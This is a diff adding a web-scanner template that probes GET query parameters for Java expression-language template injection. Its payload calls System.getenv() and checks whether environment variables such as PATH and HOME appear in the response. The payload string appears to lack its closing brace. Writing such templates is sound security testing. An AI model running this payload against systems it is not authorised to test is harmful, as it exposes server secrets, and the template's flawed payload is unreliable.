@@ -1,0 +1,38 @@
+id: scan-ssti-java-getenv
+
+info:
+  name: Scanner SSTI Reflected
+  author: reewardius
+  severity: critical
+  description: SSTI or CSTI via GET parameter
+  reference: 
+    - https://www.linkedin.com/in/hernanrodriguez-/
+    - https://twitter.com/SuhradMakwana/status/1721405829298176205
+  tags: fuzzing-ssti,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      reflection:
+      - "${T(java.lang.System).getenv()"
+      
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{reflection}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'JAVA_HOME='
+          - 'PATH='
+          - 'USERNAME='
+          - 'HOME='
+        condition: and
